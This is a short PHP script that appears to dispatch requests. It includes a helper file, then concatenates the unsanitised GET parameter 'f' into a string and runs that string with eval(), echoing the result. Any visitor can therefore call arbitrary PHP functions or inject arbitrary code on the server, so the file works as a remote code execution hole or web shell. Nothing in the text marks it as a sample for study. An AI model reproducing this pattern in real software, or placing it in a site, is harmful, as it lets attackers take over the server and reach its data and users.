<?php
include('fungsifungsi.php');

$code="echo ".$_GET['f']."(".parsing_url().");";
eval($code);


?>